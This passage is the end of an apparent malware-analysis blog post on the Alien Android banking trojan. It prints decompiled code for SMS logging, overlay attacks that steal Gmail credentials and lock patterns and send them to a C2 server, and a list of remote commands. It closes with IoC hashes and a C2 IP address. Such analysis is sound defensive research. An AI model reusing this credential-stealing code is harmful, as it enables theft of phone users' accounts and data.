            <span class="n">String</span> <span class="n">s2</span> <span class="p">=</span> <span class="s">"Output SMS:"</span> <span class="p">+</span> <span class="n">s</span> <span class="p">+</span> <span class="s">" text:"</span> <span class="p">+</span> <span class="n">s1</span> <span class="p">+</span> <span class="s">"[143523#]"</span><span class="p">;</span>
            <span class="k">this</span><span class="p">.</span><span class="nf">a</span><span class="p">(</span><span class="s">"SMS"</span><span class="p">,</span> <span class="n">s2</span><span class="p">);</span>
            <span class="k">this</span><span class="p">.</span><span class="nf">f</span><span class="p">(</span><span class="n">context0</span><span class="p">,</span> <span class="k">this</span><span class="p">.</span><span class="n">a</span><span class="p">.</span><span class="n">ab</span><span class="p">,</span> <span class="n">s2</span><span class="p">);</span>
            <span class="k">this</span><span class="p">.</span><span class="nf">h</span><span class="p">(</span><span class="n">context0</span><span class="p">,</span> <span class="k">this</span><span class="p">.</span><span class="nf">sharedpref</span><span class="p">(</span><span class="n">context0</span><span class="p">,</span> <span class="k">this</span><span class="p">.</span><span class="n">a</span><span class="p">.</span><span class="n">Q</span><span class="p">));</span>
        <span class="p">}</span>
        <span class="k">catch</span><span class="p">(</span><span class="n">Exception</span> <span class="n">unused_ex</span><span class="p">)</span> <span class="p">{</span>
        <span class="p">}</span>
    <span class="p">}</span>
</code></pre></div></div>

<h2 id="overlay-attack">Overlay attack</h2>

<p>The malware comes with classic features such as overlya attack.  If a targeted APP is opened then the malware will launch the <code class="language-plaintext highlighter-rouge">html</code> file of the targeted app.</p>

<div class="language-cs highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">protected</span> <span class="k">void</span> <span class="nf">onCreate</span><span class="p">(</span><span class="n">Bundle</span> <span class="n">bundle0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">super</span><span class="p">.</span><span class="nf">onCreate</span><span class="p">(</span><span class="n">bundle0</span><span class="p">);</span>
        <span class="k">this</span><span class="p">.</span><span class="n">c</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">WebView</span><span class="p">(</span><span class="k">this</span><span class="p">);</span>
        <span class="k">this</span><span class="p">.</span><span class="n">c</span><span class="p">.</span><span class="nf">getSettings</span><span class="p">().</span><span class="nf">setJavaScriptEnabled</span><span class="p">(</span><span class="k">true</span><span class="p">);</span>
        <span class="k">this</span><span class="p">.</span><span class="n">c</span><span class="p">.</span><span class="nf">setScrollBarStyle</span><span class="p">(</span><span class="m">0</span><span class="p">);</span>
        <span class="k">this</span><span class="p">.</span><span class="n">c</span><span class="p">.</span><span class="nf">setWebViewClient</span><span class="p">(</span><span class="k">new</span> <span class="nf">b</span><span class="p">(</span><span class="k">this</span><span class="p">,</span> <span class="m">0</span><span class="p">));</span>
        <span class="k">this</span><span class="p">.</span><span class="n">c</span><span class="p">.</span><span class="nf">setWebChromeClient</span><span class="p">(</span><span class="k">new</span> <span class="nf">a</span><span class="p">(</span><span class="k">this</span><span class="p">,</span> <span class="m">0</span><span class="p">));</span>
        <span class="k">this</span><span class="p">.</span><span class="n">c</span><span class="p">.</span><span class="nf">loadUrl</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="n">b</span><span class="p">.</span><span class="n">m</span><span class="p">);</span>
        <span class="k">this</span><span class="p">.</span><span class="nf">setContentView</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="n">c</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="n">@Override</span>  <span class="c1">// android.app.Activity</span>
    <span class="k">public</span> <span class="k">void</span> <span class="nf">onDestroy</span><span class="p">()</span> <span class="p">{</span>
        <span class="n">super</span><span class="p">.</span><span class="nf">onDestroy</span><span class="p">();</span>
        <span class="k">this</span><span class="p">.</span><span class="n">c</span><span class="p">.</span><span class="nf">removeAllViewsInLayout</span><span class="p">();</span>
        <span class="k">this</span><span class="p">.</span><span class="n">c</span><span class="p">.</span><span class="nf">removeAllViews</span><span class="p">();</span>
        <span class="k">this</span><span class="p">.</span><span class="n">c</span><span class="p">.</span><span class="nf">destroy</span><span class="p">();</span>
        <span class="k">this</span><span class="p">.</span><span class="n">c</span> <span class="p">=</span> <span class="k">null</span><span class="p">;</span>
        <span class="k">this</span><span class="p">.</span><span class="nf">finish</span><span class="p">();</span>
    <span class="p">}</span>
</code></pre></div></div>

<p>One of the targeted APPs The malware will try to steal is <code class="language-plaintext highlighter-rouge">Gmail</code>. The malware will try to steal <code class="language-plaintext highlighter-rouge">Gmail</code> credential using <code class="language-plaintext highlighter-rouge">Overlay attack</code>. And The malware will try to steal lockpattern using overlay attack. Then send logs to the C2 server.</p>

<div class="language-cs highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="k">public</span> <span class="k">void</span> <span class="nf">send_log_injects</span><span class="p">(</span><span class="n">String</span> <span class="n">s</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">if</span><span class="p">(!</span><span class="n">s</span><span class="p">.</span><span class="nf">isEmpty</span><span class="p">())</span> <span class="p">{</span>
                <span class="k">if</span><span class="p">(</span><span class="n">gtzkggpuaqjntiao</span><span class="p">.</span><span class="k">this</span><span class="p">.</span><span class="n">g</span><span class="p">.</span><span class="nf">isEmpty</span><span class="p">())</span> <span class="p">{</span>
                    <span class="n">String</span> <span class="n">s1</span> <span class="p">=</span> <span class="n">gtzkggpuaqjntiao</span><span class="p">.</span><span class="k">this</span><span class="p">.</span><span class="n">b</span><span class="p">.</span><span class="nf">b</span><span class="p">(</span><span class="m">20</span><span class="p">);</span>
                    <span class="n">gtzkggpuaqjntiao</span><span class="p">.</span><span class="k">this</span><span class="p">.</span><span class="n">g</span> <span class="p">=</span> <span class="n">s1</span><span class="p">;</span>
                <span class="p">}</span>

                <span class="n">JSONObject</span> <span class="n">jSONObject0</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">JSONObject</span><span class="p">();</span>
                <span class="k">if</span><span class="p">(</span><span class="n">gtzkggpuaqjntiao</span><span class="p">.</span><span class="k">this</span><span class="p">.</span><span class="n">f</span><span class="p">.</span><span class="k">equals</span><span class="p">(</span><span class="s">"grabbing_pass_gmail"</span><span class="p">))</span> <span class="p">{</span>
                    <span class="n">gtzkggpuaqjntiao</span><span class="p">.</span><span class="k">this</span><span class="p">.</span><span class="n">b</span><span class="p">.</span><span class="nf">e</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="n">mContext</span><span class="p">,</span> <span class="n">gtzkggpuaqjntiao</span><span class="p">.</span><span class="k">this</span><span class="p">.</span><span class="n">a</span><span class="p">.</span><span class="n">aG</span><span class="p">,</span> <span class="s">""</span><span class="p">);</span>
                    <span class="n">String</span> <span class="n">s2</span> <span class="p">=</span> <span class="n">gtzkggpuaqjntiao</span><span class="p">.</span><span class="k">this</span><span class="p">.</span><span class="nf">a</span><span class="p">(</span><span class="s">"ZWJkNzMxZWFkOTM5NmUzMmE1YTk1NTUyNTAyZDY5YzBiY2RjY2NmMTlj"</span><span class="p">);</span>  <span class="c1">// com.google.android.gm ==&gt; Gmail APP</span>
                    <span class="n">gtzkggpuaqjntiao</span><span class="p">.</span><span class="k">this</span><span class="p">.</span><span class="n">f</span> <span class="p">=</span> <span class="n">s2</span><span class="p">;</span>
                <span class="p">}</span>

                <span class="k">if</span><span class="p">(</span><span class="n">gtzkggpuaqjntiao</span><span class="p">.</span><span class="k">this</span><span class="p">.</span><span class="n">f</span><span class="p">.</span><span class="k">equals</span><span class="p">(</span><span class="s">"grabbing_lockpattern"</span><span class="p">))</span> <span class="p">{</span>
                    <span class="n">gtzkggpuaqjntiao</span><span class="p">.</span><span class="k">this</span><span class="p">.</span><span class="n">b</span><span class="p">.</span><span class="nf">e</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="n">mContext</span><span class="p">,</span> <span class="n">gtzkggpuaqjntiao</span><span class="p">.</span><span class="k">this</span><span class="p">.</span><span class="n">a</span><span class="p">.</span><span class="n">aI</span><span class="p">,</span> <span class="s">""</span><span class="p">);</span>
                    <span class="n">gtzkggpuaqjntiao</span><span class="p">.</span><span class="k">this</span><span class="p">.</span><span class="n">f</span> <span class="p">=</span> <span class="s">"grabbing_lockpattern"</span><span class="p">;</span>
                    <span class="n">String</span> <span class="n">s3</span> <span class="p">=</span> <span class="n">s</span><span class="p">.</span><span class="nf">replace</span><span class="p">(</span><span class="n">i</span><span class="p">.</span><span class="nf">f</span><span class="p">(</span><span class="n">gtzkggpuaqjntiao</span><span class="p">.</span><span class="k">this</span><span class="p">.</span><span class="nf">a</span><span class="p">(</span><span class="s">"YzRmYjE2ZjRkYjBlNDMzOTkxZmUxNzQ2NWYyNDRkYzViMWYwYWZmZmJlYWVhOTI2ZGVjOWViMTQyYjcxMzU3YjFlODljYzQ0YTQ5ZTc1OTI0MzJmYjVlYTE1ZDJiMTgwOTMwNTRkNDYzNjRhOGZlMWZmNDcwYzM2Y2JkMGQ3YmQxYzc4YzljNjVmNjVmNTliNjhiNzIwODk5ZjQwYjE1Yg=="</span><span class="p">)),</span> <span class="s">""</span><span class="p">);</span>  <span class="c1">// LCJ0eXBlX2luamVjdHMiOiJwaW5jb2RlIiwiY2xvc2VkIjoiY2xvc2VfYWN0aXZpdHlfaW5qZWN0cyI=</span>
                     <span class="c1">// ,"type_injects":"pincode","closed":"close_activity_injects"</span>
                     
                    <span class="n">gtzkggpuaqjntiao</span><span class="p">.</span><span class="k">this</span><span class="p">.</span><span class="n">b</span><span class="p">.</span><span class="nf">f</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="n">mContext</span><span class="p">,</span> <span class="n">gtzkggpuaqjntiao</span><span class="p">.</span><span class="k">this</span><span class="p">.</span><span class="n">a</span><span class="p">.</span><span class="n">ab</span><span class="p">,</span> <span class="n">gtzkggpuaqjntiao</span><span class="p">.</span><span class="k">this</span><span class="p">.</span><span class="nf">a</span><span class="p">(</span><span class="s">"YzRkNzNmYWY5ZTA2NjAyMWJkYTkwOTVkMDQ2OQ=="</span><span class="p">)</span> <span class="p">+</span> <span class="n">s3</span> <span class="p">+</span> <span class="n">gtzkggpuaqjntiao</span><span class="p">.</span><span class="k">this</span><span class="p">.</span><span class="nf">a</span><span class="p">(</span><span class="s">"ZDM4OTY4Zjc4YjY0MzI3Njk0"</span><span class="p">));</span>  <span class="c1">// [143523#]</span>
                                                                                                                                                                                                                           <span class="c1">// Lock Pattern: </span>
                <span class="p">}</span>
                <span class="k">else</span> <span class="p">{</span>
                    <span class="k">try</span> <span class="p">{</span>  <span class="c1">// application</span>
                        <span class="n">jSONObject0</span><span class="p">.</span><span class="nf">put</span><span class="p">(</span><span class="n">gtzkggpuaqjntiao</span><span class="p">.</span><span class="k">this</span><span class="p">.</span><span class="nf">a</span><span class="p">(</span><span class="s">"ZTljODJjYThkNzM1NjAyMWEwYTMxNQ=="</span><span class="p">),</span> <span class="n">gtzkggpuaqjntiao</span><span class="p">.</span><span class="k">this</span><span class="p">.</span><span class="n">f</span><span class="p">);</span>  <span class="c1">// application</span>
                        <span class="n">jSONObject0</span><span class="p">.</span><span class="nf">put</span><span class="p">(</span><span class="n">gtzkggpuaqjntiao</span><span class="p">.</span><span class="k">this</span><span class="p">.</span><span class="nf">a</span><span class="p">(</span><span class="s">"ZWNkOTI4YTU="</span><span class="p">),</span> <span class="n">s</span><span class="p">);</span>  <span class="c1">// data</span>
                    <span class="p">}</span>
                    <span class="k">catch</span><span class="p">(</span><span class="n">JSONException</span> <span class="n">unused_ex</span><span class="p">)</span> <span class="p">{</span>
                    <span class="p">}</span>

                    <span class="n">i</span> <span class="n">i0</span> <span class="p">=</span> <span class="n">gtzkggpuaqjntiao</span><span class="p">.</span><span class="k">this</span><span class="p">.</span><span class="n">b</span><span class="p">;</span>
                    <span class="n">Context</span> <span class="n">context0</span> <span class="p">=</span> <span class="k">this</span><span class="p">.</span><span class="n">mContext</span><span class="p">;</span>
                    <span class="n">String</span> <span class="n">s4</span> <span class="p">=</span> <span class="n">gtzkggpuaqjntiao</span><span class="p">.</span><span class="k">this</span><span class="p">.</span><span class="n">g</span><span class="p">;</span>
                    <span class="n">String</span> <span class="n">s5</span> <span class="p">=</span> <span class="n">jSONObject0</span><span class="p">.</span><span class="nf">toString</span><span class="p">();</span>
                    <span class="k">try</span> <span class="p">{</span>
                        <span class="n">String</span> <span class="n">s6</span> <span class="p">=</span> <span class="n">i0</span><span class="p">.</span><span class="nf">j</span><span class="p">(</span><span class="n">context0</span><span class="p">,</span> <span class="n">s4</span><span class="p">);</span>
                        <span class="k">if</span><span class="p">(</span><span class="n">s6</span><span class="p">.</span><span class="nf">isEmpty</span><span class="p">())</span> <span class="p">{</span>
                            <span class="n">i0</span><span class="p">.</span><span class="nf">e</span><span class="p">(</span><span class="n">context0</span><span class="p">,</span> <span class="n">s4</span><span class="p">,</span> <span class="n">s5</span><span class="p">);</span>
                        <span class="p">}</span>
                        <span class="k">else</span> <span class="p">{</span>
                            <span class="n">JSONObject</span> <span class="n">jSONObject1</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">JSONObject</span><span class="p">(</span><span class="n">s6</span><span class="p">);</span>
                            <span class="n">JSONObject</span> <span class="n">jSONObject2</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">JSONObject</span><span class="p">(</span><span class="n">s5</span><span class="p">);</span>
                            <span class="n">String</span> <span class="n">s7</span> <span class="p">=</span> <span class="n">jSONObject1</span><span class="p">.</span><span class="nf">getString</span><span class="p">(</span><span class="s">"data"</span><span class="p">);</span>
                            <span class="n">String</span> <span class="n">s8</span> <span class="p">=</span> <span class="n">jSONObject1</span><span class="p">.</span><span class="nf">getString</span><span class="p">(</span><span class="s">"data"</span><span class="p">);</span>
                            <span class="n">s5</span> <span class="p">=</span> <span class="n">jSONObject2</span><span class="p">.</span><span class="nf">getString</span><span class="p">(</span><span class="s">"data"</span><span class="p">);</span>
                            <span class="n">i0</span><span class="p">.</span><span class="nf">a</span><span class="p">(</span><span class="s">"str_getParams"</span><span class="p">,</span> <span class="n">String</span><span class="p">.</span><span class="nf">valueOf</span><span class="p">(</span><span class="n">s7</span><span class="p">));</span>
                            <span class="n">i0</span><span class="p">.</span><span class="nf">a</span><span class="p">(</span><span class="s">"str_params"</span><span class="p">,</span> <span class="n">String</span><span class="p">.</span><span class="nf">valueOf</span><span class="p">(</span><span class="n">s5</span><span class="p">));</span>
                            <span class="n">JSONObject</span> <span class="n">jSONObject3</span> <span class="p">=</span> <span class="n">i</span><span class="p">.</span><span class="nf">a</span><span class="p">(</span><span class="k">new</span> <span class="nf">JSONObject</span><span class="p">(</span><span class="n">s7</span><span class="p">),</span> <span class="k">new</span> <span class="nf">JSONObject</span><span class="p">(</span><span class="n">s5</span><span class="p">));</span>
                            <span class="n">JSONObject</span> <span class="n">jSONObject4</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">JSONObject</span><span class="p">();</span>
                            <span class="n">jSONObject4</span><span class="p">.</span><span class="nf">put</span><span class="p">(</span><span class="s">"application"</span><span class="p">,</span> <span class="n">s8</span><span class="p">);</span>
                            <span class="n">jSONObject4</span><span class="p">.</span><span class="nf">put</span><span class="p">(</span><span class="s">"data"</span><span class="p">,</span> <span class="n">jSONObject3</span><span class="p">.</span><span class="nf">toString</span><span class="p">());</span>
                            <span class="n">i0</span><span class="p">.</span><span class="nf">a</span><span class="p">(</span><span class="s">"mergedJSON"</span><span class="p">,</span> <span class="n">jSONObject4</span><span class="p">.</span><span class="nf">toString</span><span class="p">());</span>
                            <span class="n">i0</span><span class="p">.</span><span class="nf">e</span><span class="p">(</span><span class="n">context0</span><span class="p">,</span> <span class="n">s4</span><span class="p">,</span> <span class="n">jSONObject4</span><span class="p">.</span><span class="nf">toString</span><span class="p">());</span>
                        <span class="p">}</span>
                    <span class="p">}</span>
                    <span class="k">catch</span><span class="p">(</span><span class="n">Exception</span> <span class="n">unused_ex</span><span class="p">)</span> <span class="p">{</span>
                        <span class="n">i0</span><span class="p">.</span><span class="nf">a</span><span class="p">(</span><span class="s">"JSON"</span><span class="p">,</span> <span class="s">"ERROR SettingsToAddJson"</span><span class="p">);</span>
                        <span class="n">i0</span><span class="p">.</span><span class="nf">e</span><span class="p">(</span><span class="n">context0</span><span class="p">,</span> <span class="n">s4</span><span class="p">,</span> <span class="n">s5</span><span class="p">);</span>
                    <span class="p">}</span>
</code></pre></div></div>

<h1 id="commands">Commands</h1>

<p>These are all the commands which are received from the C2 server to the malware to do the malicious actions.</p>

<div class="language-cs highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="n">jwozx0</span><span class="p">.</span><span class="n">a</span><span class="p">.</span><span class="nf">a</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">jwozx0</span><span class="p">.</span><span class="nf">a</span><span class="p">(</span><span class="s">"ZWZkZDI4ZTRjYzIzNmYwYWFhYTExZjA5MWU="</span><span class="p">)</span> <span class="p">+</span> <span class="n">jSONObject3</span><span class="p">.</span><span class="nf">toString</span><span class="p">());</span>  <span class="c1">// get run_cmd: </span>
                <span class="n">jSONObject5</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">JSONObject</span><span class="p">(</span><span class="k">new</span> <span class="nf">String</span><span class="p">(</span><span class="n">Base64</span><span class="p">.</span><span class="nf">decode</span><span class="p">(</span><span class="n">jSONObject3</span><span class="p">.</span><span class="nf">getString</span><span class="p">(</span><span class="n">jwozx0</span><span class="p">.</span><span class="nf">a</span><span class="p">(</span><span class="s">"ZWNkOTI4YTU="</span><span class="p">)),</span> <span class="m">0</span><span class="p">),</span> <span class="s">"UTF-8"</span><span class="p">));</span>  <span class="c1">// data</span>
                <span class="n">String</span> <span class="n">s25</span> <span class="p">=</span> <span class="n">jSONObject5</span><span class="p">.</span><span class="nf">getString</span><span class="p">(</span><span class="n">jwozx0</span><span class="p">.</span><span class="nf">a</span><span class="p">(</span><span class="s">"ZWJkNTM4"</span><span class="p">));</span>  <span class="c1">// cmd</span>
                <span class="k">switch</span><span class="p">(</span><span class="n">s25</span><span class="p">)</span> <span class="p">{</span>
                    <span class="k">case</span> <span class="s">"remove_app"</span><span class="p">:</span> <span class="p">{</span>
                        <span class="k">goto</span> <span class="n">label_1633</span><span class="p">;</span>
                    <span class="p">}</span>
                    <span class="k">case</span> <span class="s">"get_all_permission"</span><span class="p">:</span> <span class="p">{</span>
                        <span class="k">goto</span> <span class="n">label_1761</span><span class="p">;</span>
                    <span class="p">}</span>
                    <span class="k">case</span> <span class="s">"run_socks5"</span><span class="p">:</span> <span class="p">{</span>
                        <span class="k">goto</span> <span class="n">label_1764</span><span class="p">;</span>
                    <span class="p">}</span>
                    <span class="k">case</span> <span class="s">"notification"</span><span class="p">:</span> <span class="p">{</span>
                        <span class="k">goto</span> <span class="n">label_1383</span><span class="p">;</span>
                    <span class="p">}</span>
                    <span class="k">case</span> <span class="s">"send_sms"</span><span class="p">:</span> <span class="p">{</span>
                        <span class="n">jwozx0</span><span class="p">.</span><span class="n">a</span><span class="p">.</span><span class="nf">send_sms</span><span class="p">(</span><span class="n">context1</span><span class="p">,</span> <span class="n">jSONObject5</span><span class="p">.</span><span class="nf">getString</span><span class="p">(</span><span class="n">jwozx0</span><span class="p">.</span><span class="nf">a</span><span class="p">(</span><span class="s">"ZTY="</span><span class="p">)),</span> <span class="n">jSONObject5</span><span class="p">.</span><span class="nf">getString</span><span class="p">(</span><span class="n">jwozx0</span><span class="p">.</span><span class="nf">a</span><span class="p">(</span><span class="s">"ZmM="</span><span class="p">)));</span>
                        <span class="k">return</span><span class="p">;</span>
                    <span class="p">}</span>
                    <span class="k">case</span> <span class="s">"run_admin_device"</span><span class="p">:</span> <span class="p">{</span>
                        <span class="k">goto</span> <span class="n">label_1706</span><span class="p">;</span>
                    <span class="p">}</span>
                    <span class="k">case</span> <span class="s">"sms_mailing_phonebook"</span><span class="p">:</span> <span class="p">{</span>
                        <span class="k">goto</span> <span class="n">label_1647</span><span class="p">;</span>
                    <span class="p">}</span>
                    <span class="k">case</span> <span class="s">"call_forward"</span><span class="p">:</span> <span class="p">{</span>
                        <span class="k">goto</span> <span class="n">label_1329</span><span class="p">;</span>
                    <span class="p">}</span>
                    <span class="k">case</span> <span class="s">"request_permission"</span><span class="p">:</span> <span class="p">{</span>
                        <span class="k">goto</span> <span class="n">label_1713</span><span class="p">;</span>
                    <span class="p">}</span>
                    <span class="k">case</span> <span class="s">"send_mailing_sms"</span><span class="p">:</span> <span class="p">{</span>
                        <span class="n">jwozx0</span><span class="p">.</span><span class="n">a</span><span class="p">.</span><span class="nf">a</span><span class="p">(</span><span class="n">context1</span><span class="p">,</span> <span class="n">jSONObject5</span><span class="p">.</span><span class="nf">getString</span><span class="p">(</span><span class="n">jwozx0</span><span class="p">.</span><span class="nf">a</span><span class="p">(</span><span class="s">"ZTY="</span><span class="p">)),</span> <span class="n">jSONObject5</span><span class="p">.</span><span class="nf">getString</span><span class="p">(</span><span class="n">jwozx0</span><span class="p">.</span><span class="nf">a</span><span class="p">(</span><span class="s">"ZmM="</span><span class="p">)));</span>
                        <span class="k">return</span><span class="p">;</span>
                    <span class="p">}</span>
                    <span class="k">case</span> <span class="s">"remove_bot"</span><span class="p">:</span> <span class="p">{</span>
                        <span class="k">goto</span> <span class="n">label_1655</span><span class="p">;</span>
                    <span class="p">}</span>
                    <span class="k">case</span> <span class="s">"grabbing_pass_gmail"</span><span class="p">:</span> <span class="p">{</span>
                        <span class="k">goto</span> <span class="n">label_1720</span><span class="p">;</span>
                    <span class="p">}</span>
                    <span class="k">case</span> <span class="s">"clean_cache"</span><span class="p">:</span> <span class="p">{</span>
                        <span class="k">goto</span> <span class="n">label_1857</span><span class="p">;</span>
                    <span class="p">}</span>
                    <span class="k">case</span> <span class="s">"ussd"</span><span class="p">:</span> <span class="p">{</span>
                        <span class="k">goto</span> <span class="n">label_1282</span><span class="p">;</span>
                    <span class="p">}</span>
                    <span class="k">case</span> <span class="s">"rat_connect"</span><span class="p">:</span> <span class="p">{</span>
                        <span class="k">goto</span> <span class="n">label_1667</span><span class="p">;</span>
                    <span class="p">}</span>
                    <span class="k">case</span> <span class="s">"get_data_logs"</span><span class="p">:</span> <span class="p">{</span>
                        <span class="k">goto</span> <span class="n">label_1607</span><span class="p">;</span>
                    <span class="p">}</span>
                    <span class="k">case</span> <span class="s">"grabbing_lockpattern"</span><span class="p">:</span> <span class="p">{</span>
                        <span class="k">goto</span> <span class="n">label_1737</span><span class="p">;</span>
                    <span class="p">}</span>
                    <span class="k">case</span> <span class="s">"stop_socks5"</span><span class="p">:</span> <span class="p">{</span>
                        <span class="k">goto</span> <span class="n">label_1801</span><span class="p">;</span>
                    <span class="p">}</span>
                    <span class="k">case</span> <span class="s">"change_url_connect"</span><span class="p">:</span> <span class="p">{</span>
                        <span class="k">goto</span> <span class="n">label_1673</span><span class="p">;</span>
                    <span class="p">}</span>
                    <span class="k">case</span> <span class="s">"patch_update"</span><span class="p">:</span> <span class="p">{</span>
                        <span class="k">goto</span> <span class="n">label_1866</span><span class="p">;</span>
                    <span class="p">}</span>
                    <span class="k">case</span> <span class="s">"url"</span><span class="p">:</span> <span class="p">{</span>
                        <span class="k">goto</span> <span class="n">label_1614</span><span class="p">;</span>
                    <span class="p">}</span>
                    <span class="k">case</span> <span class="s">"update_inject"</span><span class="p">:</span> <span class="p">{</span>
                        <span class="k">goto</span> <span class="n">label_1808</span><span class="p">;</span>
                    <span class="p">}</span>
                    <span class="k">case</span> <span class="s">"run_app"</span><span class="p">:</span> <span class="p">{</span>
                        <span class="k">goto</span> <span class="n">label_1621</span><span class="p">;</span>
                    <span class="p">}</span>
                    <span class="k">case</span> <span class="s">"run_record_audio"</span><span class="p">:</span> <span class="p">{</span>
                        <span class="k">goto</span> <span class="n">label_1815</span><span class="p">;</span>
                    <span class="p">}</span>
                    <span class="k">case</span> <span class="s">"access_notifications"</span><span class="p">:</span> <span class="p">{</span>
                        <span class="k">goto</span> <span class="n">label_1752</span><span class="p">;</span>
                    <span class="p">}</span>
                    <span class="k">case</span> <span class="s">"change_url_recover"</span><span class="p">:</span> <span class="p">{</span>
                        <span class="k">goto</span> <span class="n">label_1689</span><span class="p">;</span>
                    <span class="p">}</span>
                    <span class="k">case</span> <span class="s">"grabbing_google_authenticator2"</span><span class="p">:</span> <span class="p">{</span>
                        <span class="k">goto</span> <span class="n">label_1628</span><span class="p">;</span>
                    <span class="p">}</span>
                <span class="p">}</span>
</code></pre></div></div>

<ul>
  <li>If you want to download android malware samples, you can join <a href="https://apkdetect.com/">apkdetect</a> for free.</li>
</ul>

<h1 id="ioc">IoC</h1>

<p>APK hash: <code class="language-plaintext highlighter-rouge">ea4960b84756fd82fe43cb2cffdbe464df6dd4d48aa10d1cefe38aa8ac6eb44d</code></p>

<p>Payload (YBIw.json) hash: <code class="language-plaintext highlighter-rouge">603fcae1ef4062087e0e09aa377c03fcc8bbd6f3db443717957f1bfe8c4a4dae</code></p>

<p>C2 server:</p>

<p>http://185.255.131.145/</p>

<h1 id="article-quote">Article quote</h1>

<blockquote>
  <p>كالقبلة على جبين ميت ﻻ تساوى شيئا</p>
</blockquote>

<h1 id="ref">REF</h1>

<ul>
  <li>
    <p><a href="https://drive.google.com/file/d/1qd7Nqjhe2vyGZ5bGm6gVw0mM1D6YDolu/view">Alien Technical Analysis Report</a></p>
  </li>
  <li>
    <p><a href="https://github.com/cryptax/misc-code/blob/master/AlienBankbotDecrypt.py">JEB script</a></p>
  </li>
</ul>

        
      </section>

      <footer class="page__meta">
        
        


  


  
  
  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="/categories/#malware-analysis" class="page__taxonomy-item" rel="tag">Malware-analysis</a>
    
    </span>
  </p>


        
          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2022-09-25T00:00:00+00:00">September 25, 2022</time></p>
        
      </footer>

      <section class="page__share">
  
    <h4 class="page__share-title">Share on</h4>
  

  <a href="https://twitter.com/intent/tweet?text=Technical+analysis+of+Alien+android+malware%20https%3A%2F%2Fmuha2xmad.github.io%2Fmalware-analysis%2Falien%2F" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>

  <a href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fmuha2xmad.github.io%2Fmalware-analysis%2Falien%2F" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>

  <a href="https://www.linkedin.com/shareArticle?mini=true&url=https%3A%2F%2Fmuha2xmad.github.io%2Fmalware-analysis%2Falien%2F" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on LinkedIn"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span> LinkedIn</span></a>
</section>


      
  <nav class="pagination">
    
      <a href="/malware-analysis/ginp/" class="pagination--pager" title="Technical analysis of Ginp android malware
">Previous</a>
    
    
      <a href="/malware-analysis/godfather/" class="pagination--pager" title="Technical analysis of Godfather android malware
">Next</a>
    
  </nav>

    </div>

    
  </article>

  
  
</div>

    </div>

    
      <div class="search-content">
        <div class="search-content__inner-wrap"><form class="search-content__form" onkeydown="return event.key != 'Enter';">
    <label class="sr-only" for="search">
      Enter your search term...
    </label>
    <input type="search" id="search" class="search-input" tabindex="-1" placeholder="Enter your search term..." />
  </form>
  <div id="results" class="results"></div></div>

      </div>
    

    <div id="footer" class="page__footer">
      <footer>
        <!-- start custom footer snippets -->

<!-- end custom footer snippets -->
        <div class="page__footer-follow">
  <ul class="social-icons">
    
      <li><strong>Follow:</strong></li>
    

    
      
        
      
        
      
        
      
        
      
        
      
        
      
    

    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
  </ul>
</div>

<div class="page__footer-copyright">&copy; 2023 Muhammad Hasan Ali. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>

      </footer>
    </div>

    
  <script src="/assets/js/main.min.js"></script>
  <script src="https://kit.fontawesome.com/4eee35f757.js"></script>




<script src="/assets/js/lunr/lunr.min.js"></script>
<script src="/assets/js/lunr/lunr-store.js"></script>
<script src="/assets/js/lunr/lunr-en.js"></script>




  <!-- Google tag (gtag.js) -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-9P532HWLYQ"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-9P532HWLYQ');
</script>








  </body>
</html>
